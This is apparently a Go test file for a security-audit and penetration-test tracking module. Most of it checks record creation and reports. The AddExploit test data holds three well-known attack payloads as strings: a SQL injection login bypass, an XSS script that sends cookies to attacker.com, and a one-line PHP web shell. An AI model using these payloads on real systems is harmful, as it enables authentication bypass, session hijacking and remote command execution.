package security

import (
	"context"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewSecurityAuditor(t *testing.T) {
	tests := []struct {
		name   string
		config *SecurityAuditConfig
	}{
		{
			name:   "default config",
			config: nil,
		},
		{
			name: "custom config",
			config: &SecurityAuditConfig{
				AuditFrequency:           15 * 24 * time.Hour,
				PenetrationTestFrequency: 60 * 24 * time.Hour,
				VulnerabilityScanning:    true,
				CodeAnalysis:             true,
				InfrastructureAudit:      true,
				ComplianceAudit:          true,
				ThirdPartyAudit:          false,
				AutomatedTesting:         true,
				ManualTesting:            false,
				ReportGeneration:         true,
				RemediationTracking:      true,
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mockLogger := &MockLogger{}
			sa := NewSecurityAuditor(tt.config, mockLogger)
			assert.NotNil(t, sa)
			assert.NotNil(t, sa.config)
		})
	}
}

func TestSecurityAuditor_StartAudit(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name        string
		auditType   string
		title       string
		description string
		auditor     string
		scope       []string
		expectError bool
	}{
		{
			name:        "vulnerability assessment",
			auditType:   "vulnerability_assessment",
			title:       "Q1 2024 Vulnerability Assessment",
			description: "Comprehensive vulnerability assessment of all systems",
			auditor:     "security_team",
			scope:       []string{"web_servers", "database_servers", "network_devices"},
			expectError: false,
		},
		{
			name:        "code review",
			auditType:   "code_review",
			title:       "Security Code Review",
			description: "Security-focused code review of critical components",
			auditor:     "senior_developer",
			scope:       []string{"authentication_module", "payment_processing", "data_encryption"},
			expectError: false,
		},
		{
			name:        "infrastructure audit",
			auditType:   "infrastructure_audit",
			title:       "Infrastructure Security Audit",
			description: "Security audit of infrastructure components",
			auditor:     "infrastructure_team",
			scope:       []string{"servers", "networks", "storage", "backup_systems"},
			expectError: false,
		},
		{
			name:        "compliance audit",
			auditType:   "compliance_audit",
			title:       "ISO 27001 Compliance Audit",
			description: "Compliance audit against ISO 27001 standards",
			auditor:     "compliance_officer",
			scope:       []string{"information_security_management", "access_control", "incident_management"},
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			audit, err := sa.StartAudit(ctx, tt.auditType, tt.title, tt.description, tt.auditor, tt.scope)

			require.NoError(t, err)
			assert.NotNil(t, audit)
			assert.Equal(t, tt.auditType, audit.Type)
			assert.Equal(t, tt.title, audit.Title)
			assert.Equal(t, tt.description, audit.Description)
			assert.Equal(t, tt.auditor, audit.Auditor)
			assert.Equal(t, tt.scope, audit.Scope)
			assert.Equal(t, "IN_PROGRESS", audit.Status)
			assert.False(t, audit.StartDate.IsZero())
			assert.NotEmpty(t, audit.Methodology)
			assert.NotNil(t, audit.Findings)
			assert.NotNil(t, audit.Recommendations)
		})
	}
}

func TestSecurityAuditor_AddFinding(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name            string
		auditID         string
		title           string
		description     string
		severity        string
		category        string
		cvssScore       float64
		affectedSystems []string
		evidence        []string
		remediation     string
		expectError     bool
	}{
		{
			name:            "critical finding",
			auditID:         "audit_vulnerability_assessment_1234567890",
			title:           "SQL Injection Vulnerability",
			description:     "Application is vulnerable to SQL injection attacks",
			severity:        "CRITICAL",
			category:        "injection",
			cvssScore:       9.8,
			affectedSystems: []string{"web_application", "database"},
			evidence:        []string{"screenshot", "proof_of_concept", "scan_results"},
			remediation:     "Implement parameterized queries and input validation",
			expectError:     false,
		},
		{
			name:            "high severity finding",
			auditID:         "audit_vulnerability_assessment_1234567890",
			title:           "Weak Password Policy",
			description:     "Password policy allows weak passwords",
			severity:        "HIGH",
			category:        "authentication",
			cvssScore:       7.5,
			affectedSystems: []string{"authentication_system"},
			evidence:        []string{"policy_document", "test_results"},
			remediation:     "Implement stronger password requirements",
			expectError:     false,
		},
		{
			name:            "medium severity finding",
			auditID:         "audit_vulnerability_assessment_1234567890",
			title:           "Information Disclosure",
			description:     "Sensitive information exposed in error messages",
			severity:        "MEDIUM",
			category:        "information_disclosure",
			cvssScore:       5.3,
			affectedSystems: []string{"web_application"},
			evidence:        []string{"error_message_screenshot"},
			remediation:     "Sanitize error messages",
			expectError:     false,
		},
		{
			name:            "low severity finding",
			auditID:         "audit_vulnerability_assessment_1234567890",
			title:           "Missing Security Headers",
			description:     "Security headers not implemented",
			severity:        "LOW",
			category:        "security_configuration",
			cvssScore:       3.1,
			affectedSystems: []string{"web_application"},
			evidence:        []string{"header_analysis"},
			remediation:     "Implement security headers",
			expectError:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			finding, err := sa.AddFinding(ctx, tt.auditID, tt.title, tt.description, tt.severity, tt.category, tt.cvssScore, tt.affectedSystems, tt.evidence, tt.remediation)

			require.NoError(t, err)
			assert.NotNil(t, finding)
			assert.Equal(t, tt.auditID, finding.AuditID)
			assert.Equal(t, tt.title, finding.Title)
			assert.Equal(t, tt.description, finding.Description)
			assert.Equal(t, tt.severity, finding.Severity)
			assert.Equal(t, tt.category, finding.Category)
			assert.Equal(t, tt.cvssScore, finding.CVSSScore)
			assert.Equal(t, tt.affectedSystems, finding.AffectedSystems)
			assert.Equal(t, tt.evidence, finding.Evidence)
			assert.Equal(t, tt.remediation, finding.Remediation)
			assert.Equal(t, "OPEN", finding.Status)
			assert.False(t, finding.CreatedAt.IsZero())
			assert.False(t, finding.UpdatedAt.IsZero())
		})
	}
}

func TestSecurityAuditor_UpdateFinding(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name        string
		findingID   string
		status      string
		assignedTo  string
		dueDate     *time.Time
		expectError bool
	}{
		{
			name:        "assign finding",
			findingID:   "finding_audit_1234567890",
			status:      "ASSIGNED",
			assignedTo:  "developer_1",
			dueDate:     timePtr(time.Now().Add(7 * 24 * time.Hour)),
			expectError: false,
		},
		{
			name:        "update status only",
			findingID:   "finding_audit_1234567890",
			status:      "IN_PROGRESS",
			assignedTo:  "",
			dueDate:     nil,
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			err := sa.UpdateFinding(ctx, tt.findingID, tt.status, tt.assignedTo, tt.dueDate)

			if tt.expectError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestSecurityAuditor_ResolveFinding(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name        string
		findingID   string
		resolution  string
		expectError bool
	}{
		{
			name:        "resolve finding",
			findingID:   "finding_audit_1234567890",
			resolution:  "Fixed by implementing parameterized queries",
			expectError: false,
		},
		{
			name:        "resolve as false positive",
			findingID:   "finding_audit_1234567890",
			resolution:  "False positive - not exploitable in this context",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			err := sa.ResolveFinding(ctx, tt.findingID, tt.resolution)

			if tt.expectError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestSecurityAuditor_CompleteAudit(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	findings := []SecurityFinding{
		{
			ID:        "finding_1",
			Severity:  "CRITICAL",
			CVSSScore: 9.8,
		},
		{
			ID:        "finding_2",
			Severity:  "HIGH",
			CVSSScore: 7.5,
		},
		{
			ID:        "finding_3",
			Severity:  "MEDIUM",
			CVSSScore: 5.3,
		},
	}

	recommendations := []string{
		"Implement input validation",
		"Strengthen password policies",
		"Add security headers",
	}

	ctx := context.Background()
	err := sa.CompleteAudit(ctx, "audit_1234567890", findings, recommendations, 85.5, 7.2)

	assert.NoError(t, err)
}

func TestSecurityAuditor_StartPenetrationTest(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name        string
		testType    string
		title       string
		description string
		tester      string
		targets     []string
		expectError bool
	}{
		{
			name:        "web application test",
			testType:    "web_application",
			title:       "Web Application Penetration Test",
			description: "Comprehensive penetration test of web application",
			tester:      "penetration_tester_1",
			targets:     []string{"https://app.example.com", "https://api.example.com"},
			expectError: false,
		},
		{
			name:        "network test",
			testType:    "network",
			title:       "Network Penetration Test",
			description: "Network infrastructure penetration test",
			tester:      "network_security_expert",
			targets:     []string{"192.168.1.0/24", "10.0.0.0/8"},
			expectError: false,
		},
		{
			name:        "wireless test",
			testType:    "wireless",
			title:       "Wireless Security Assessment",
			description: "Wireless network security assessment",
			tester:      "wireless_security_specialist",
			targets:     []string{"office_wifi", "guest_wifi"},
			expectError: false,
		},
		{
			name:        "social engineering test",
			testType:    "social_engineering",
			title:       "Social Engineering Assessment",
			description: "Social engineering awareness assessment",
			tester:      "social_engineering_expert",
			targets:     []string{"employees", "contractors"},
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			test, err := sa.StartPenetrationTest(ctx, tt.testType, tt.title, tt.description, tt.tester, tt.targets)

			require.NoError(t, err)
			assert.NotNil(t, test)
			assert.Equal(t, tt.testType, test.Type)
			assert.Equal(t, tt.title, test.Title)
			assert.Equal(t, tt.description, test.Description)
			assert.Equal(t, tt.tester, test.Tester)
			assert.Equal(t, tt.targets, test.Targets)
			assert.Equal(t, "IN_PROGRESS", test.Status)
			assert.False(t, test.StartDate.IsZero())
			assert.NotEmpty(t, test.Methodology)
			assert.NotNil(t, test.Vulnerabilities)
			assert.NotNil(t, test.Exploits)
			assert.NotNil(t, test.Recommendations)
		})
	}
}

func TestSecurityAuditor_AddVulnerability(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name            string
		testID          string
		vulnName        string
		description     string
		severity        string
		cvssScore       float64
		cvssVector      string
		cve             string
		affectedSystems []string
		proofOfConcept  string
		remediation     string
		expectError     bool
	}{
		{
			name:            "critical vulnerability",
			testID:          "test_web_application_1234567890",
			vulnName:        "Remote Code Execution",
			description:     "Application allows remote code execution through file upload",
			severity:        "CRITICAL",
			cvssScore:       9.8,
			cvssVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			cve:             "CVE-2024-1234",
			affectedSystems: []string{"web_server", "application_server"},
			proofOfConcept:  "Upload malicious PHP file and execute commands",
			remediation:     "Implement file type validation and sandboxing",
			expectError:     false,
		},
		{
			name:            "high vulnerability",
			testID:          "test_web_application_1234567890",
			vulnName:        "SQL Injection",
			description:     "SQL injection vulnerability in login form",
			severity:        "HIGH",
			cvssScore:       8.8,
			cvssVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
			cve:             "CVE-2024-5678",
			affectedSystems: []string{"database", "web_application"},
			proofOfConcept:  "Inject SQL commands through username field",
			remediation:     "Use parameterized queries",
			expectError:     false,
		},
		{
			name:            "medium vulnerability",
			testID:          "test_web_application_1234567890",
			vulnName:        "Cross-Site Scripting",
			description:     "Reflected XSS in search functionality",
			severity:        "MEDIUM",
			cvssScore:       6.1,
			cvssVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
			cve:             "",
			affectedSystems: []string{"web_application"},
			proofOfConcept:  "Inject JavaScript in search parameter",
			remediation:     "Implement output encoding",
			expectError:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			vulnerability, err := sa.AddVulnerability(ctx, tt.testID, tt.vulnName, tt.description, tt.severity, tt.cvssScore, tt.cvssVector, tt.cve, tt.affectedSystems, tt.proofOfConcept, tt.remediation)

			require.NoError(t, err)
			assert.NotNil(t, vulnerability)
			assert.Equal(t, tt.testID, vulnerability.TestID)
			assert.Equal(t, tt.vulnName, vulnerability.Name)
			assert.Equal(t, tt.description, vulnerability.Description)
			assert.Equal(t, tt.severity, vulnerability.Severity)
			assert.Equal(t, tt.cvssScore, vulnerability.CVSSScore)
			assert.Equal(t, tt.cvssVector, vulnerability.CVSSVector)
			assert.Equal(t, tt.cve, vulnerability.CVE)
			assert.Equal(t, tt.affectedSystems, vulnerability.AffectedSystems)
			assert.Equal(t, tt.proofOfConcept, vulnerability.ProofOfConcept)
			assert.Equal(t, tt.remediation, vulnerability.Remediation)
			assert.Equal(t, "OPEN", vulnerability.Status)
			assert.False(t, vulnerability.CreatedAt.IsZero())
			assert.False(t, vulnerability.UpdatedAt.IsZero())
		})
	}
}

func TestSecurityAuditor_AddExploit(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name        string
		testID      string
		exploitName string
		description string
		exploitType string
		target      string
		payload     string
		result      string
		impact      string
		expectError bool
	}{
		{
			name:        "SQL injection exploit",
			testID:      "test_web_application_1234567890",
			exploitName: "SQL Injection Exploit",
			description: "Exploit SQL injection vulnerability to extract data",
			exploitType: "sql_injection",
			target:      "login_form",
			payload:     "admin' OR '1'='1' --",
			result:      "Successfully bypassed authentication",
			impact:      "Complete authentication bypass",
			expectError: false,
		},
		{
			name:        "XSS exploit",
			testID:      "test_web_application_1234567890",
			exploitName: "XSS Cookie Theft",
			description: "Exploit XSS to steal user cookies",
			exploitType: "cross_site_scripting",
			target:      "search_functionality",
			payload:     "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
			result:      "Successfully executed JavaScript",
			impact:      "Session hijacking possible",
			expectError: false,
		},
		{
			name:        "file upload exploit",
			testID:      "test_web_application_1234567890",
			exploitName: "Malicious File Upload",
			description: "Upload malicious file to gain shell access",
			exploitType: "file_upload",
			target:      "file_upload_feature",
			payload:     "<?php system($_GET['cmd']); ?>",
			result:      "Successfully uploaded and executed file",
			impact:      "Remote code execution achieved",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			exploit, err := sa.AddExploit(ctx, tt.testID, tt.exploitName, tt.description, tt.exploitType, tt.target, tt.payload, tt.result, tt.impact)

			require.NoError(t, err)
			assert.NotNil(t, exploit)
			assert.Equal(t, tt.testID, exploit.TestID)
			assert.Equal(t, tt.exploitName, exploit.Name)
			assert.Equal(t, tt.description, exploit.Description)
			assert.Equal(t, tt.exploitType, exploit.Type)
			assert.Equal(t, tt.target, exploit.Target)
			assert.Equal(t, tt.payload, exploit.Payload)
			assert.Equal(t, tt.result, exploit.Result)
			assert.Equal(t, tt.impact, exploit.Impact)
			assert.False(t, exploit.CreatedAt.IsZero())
			assert.False(t, exploit.UpdatedAt.IsZero())
		})
	}
}

func TestSecurityAuditor_CompletePenetrationTest(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	vulnerabilities := []Vulnerability{
		{
			ID:        "vuln_1",
			Severity:  "CRITICAL",
			CVSSScore: 9.8,
		},
		{
			ID:        "vuln_2",
			Severity:  "HIGH",
			CVSSScore: 7.5,
		},
	}

	exploits := []Exploit{
		{
			ID:   "exploit_1",
			Type: "sql_injection",
		},
		{
			ID:   "exploit_2",
			Type: "xss",
		},
	}

	recommendations := []string{
		"Implement input validation",
		"Add security headers",
		"Conduct regular security testing",
	}

	riskAssessment := "High risk due to critical vulnerabilities that allow remote code execution"

	ctx := context.Background()
	err := sa.CompletePenetrationTest(ctx, "test_1234567890", vulnerabilities, exploits, recommendations, riskAssessment)

	assert.NoError(t, err)
}

func TestSecurityAuditor_PerformComplianceCheck(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name        string
		auditID     string
		framework   string
		control     string
		requirement string
		evidence    []string
		expectError bool
	}{
		{
			name:        "ISO 27001 control",
			auditID:     "audit_compliance_1234567890",
			framework:   "ISO 27001",
			control:     "A.9.1.1",
			requirement: "Access control policy",
			evidence:    []string{"access_control_policy.pdf", "implementation_notes.docx"},
			expectError: false,
		},
		{
			name:        "SOC 2 control",
			auditID:     "audit_compliance_1234567890",
			framework:   "SOC 2",
			control:     "CC6.1",
			requirement: "Logical access security",
			evidence:    []string{"user_access_review.xlsx", "access_control_matrix.pdf"},
			expectError: false,
		},
		{
			name:        "PCI DSS control",
			auditID:     "audit_compliance_1234567890",
			framework:   "PCI DSS",
			control:     "3.4",
			requirement: "Render PAN unreadable",
			evidence:    []string{"encryption_implementation.pdf", "key_management_procedures.docx"},
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			check, err := sa.PerformComplianceCheck(ctx, tt.auditID, tt.framework, tt.control, tt.requirement, tt.evidence)

			require.NoError(t, err)
			assert.NotNil(t, check)
			assert.Equal(t, tt.auditID, check.AuditID)
			assert.Equal(t, tt.framework, check.Framework)
			assert.Equal(t, tt.control, check.Control)
			assert.Equal(t, tt.requirement, check.Requirement)
			assert.Equal(t, tt.evidence, check.Evidence)
			assert.Equal(t, "PASS", check.Status)
			assert.False(t, check.CreatedAt.IsZero())
			assert.False(t, check.UpdatedAt.IsZero())
		})
	}
}

func TestSecurityAuditor_GenerateAuditReport(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	ctx := context.Background()
	report, err := sa.GenerateAuditReport(ctx, "audit_1234567890")

	require.NoError(t, err)
	assert.NotNil(t, report)
	assert.Contains(t, report, "audit_id")
	assert.Contains(t, report, "generated_at")
	assert.Contains(t, report, "summary")
	assert.Contains(t, report, "findings")
	assert.Contains(t, report, "recommendations")
	assert.Contains(t, report, "compliance")
	assert.Contains(t, report, "methodology")
	assert.Contains(t, report, "scope")

	// Check summary structure
	summary, ok := report["summary"].(map[string]interface{})
	assert.True(t, ok)
	assert.Contains(t, summary, "total_findings")
	assert.Contains(t, summary, "critical_findings")
	assert.Contains(t, summary, "high_findings")
	assert.Contains(t, summary, "medium_findings")
	assert.Contains(t, summary, "low_findings")
	assert.Contains(t, summary, "compliance_score")
	assert.Contains(t, summary, "risk_score")
}

func TestSecurityAuditor_GeneratePenetrationTestReport(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	ctx := context.Background()
	report, err := sa.GeneratePenetrationTestReport(ctx, "test_1234567890")

	require.NoError(t, err)
	assert.NotNil(t, report)
	assert.Contains(t, report, "test_id")
	assert.Contains(t, report, "generated_at")
	assert.Contains(t, report, "summary")
	assert.Contains(t, report, "vulnerabilities")
	assert.Contains(t, report, "exploits")
	assert.Contains(t, report, "recommendations")
	assert.Contains(t, report, "risk_assessment")
	assert.Contains(t, report, "methodology")
	assert.Contains(t, report, "targets")

	// Check summary structure
	summary, ok := report["summary"].(map[string]interface{})
	assert.True(t, ok)
	assert.Contains(t, summary, "total_vulnerabilities")
	assert.Contains(t, summary, "critical_vulnerabilities")
	assert.Contains(t, summary, "high_vulnerabilities")
	assert.Contains(t, summary, "medium_vulnerabilities")
	assert.Contains(t, summary, "low_vulnerabilities")
	assert.Contains(t, summary, "total_exploits")
	assert.Contains(t, summary, "successful_exploits")
}

func TestSecurityAuditor_ScheduleAudit(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	ctx := context.Background()
	scheduledDate := time.Now().Add(30 * 24 * time.Hour)

	err := sa.ScheduleAudit(ctx, "vulnerability_assessment", "Q2 2024 Assessment", "Scheduled vulnerability assessment", "security_team", []string{"all_systems"}, scheduledDate)

	assert.NoError(t, err)
}

func TestSecurityAuditor_SchedulePenetrationTest(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	ctx := context.Background()
	scheduledDate := time.Now().Add(90 * 24 * time.Hour)

	err := sa.SchedulePenetrationTest(ctx, "web_application", "Q2 2024 Penetration Test", "Scheduled penetration test", "penetration_tester", []string{"https://app.example.com"}, scheduledDate)

	assert.NoError(t, err)
}

func TestSecurityAuditor_GetMethodology(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name      string
		auditType string
		expected  []string
	}{
		{
			name:      "vulnerability assessment",
			auditType: "vulnerability_assessment",
			expected:  []string{"Automated vulnerability scanning", "Manual verification of findings", "Risk assessment and prioritization", "Remediation planning"},
		},
		{
			name:      "code review",
			auditType: "code_review",
			expected:  []string{"Static code analysis", "Manual code review", "Security pattern analysis", "Vulnerability identification"},
		},
		{
			name:      "infrastructure audit",
			auditType: "infrastructure_audit",
			expected:  []string{"Configuration review", "Network security assessment", "Access control evaluation", "System hardening verification"},
		},
		{
			name:      "compliance audit",
			auditType: "compliance_audit",
			expected:  []string{"Control framework mapping", "Evidence collection", "Gap analysis", "Compliance scoring"},
		},
		{
			name:      "unknown audit type",
			auditType: "unknown_type",
			expected:  []string{"Standard security audit methodology"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			methodology := sa.getMethodology(tt.auditType)
			assert.Equal(t, tt.expected, methodology)
		})
	}
}

func TestSecurityAuditor_GetTestMethodology(t *testing.T) {
	mockLogger := &MockLogger{}
	sa := NewSecurityAuditor(nil, mockLogger)

	tests := []struct {
		name     string
		testType string
		expected []string
	}{
		{
			name:     "web application test",
			testType: "web_application",
			expected: []string{"OWASP Top 10 testing", "Authentication and session management", "Input validation testing", "Business logic testing"},
		},
		{
			name:     "network test",
			testType: "network",
			expected: []string{"Network discovery and enumeration", "Service identification", "Vulnerability exploitation", "Privilege escalation"},
		},
		{
			name:     "wireless test",
			testType: "wireless",
			expected: []string{"Wireless network discovery", "Encryption analysis", "Authentication bypass", "Rogue access point detection"},
		},
		{
			name:     "social engineering test",
			testType: "social_engineering",
			expected: []string{"Phishing simulation", "Physical security testing", "Pretexting scenarios", "Security awareness assessment"},
		},
		{
			name:     "unknown test type",
			testType: "unknown_type",
			expected: []string{"Standard penetration testing methodology"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			methodology := sa.getTestMethodology(tt.testType)
			assert.Equal(t, tt.expected, methodology)
		})
	}
}

// Helper function to create time pointer
func timePtr(t time.Time) *time.Time {
	return &t
}
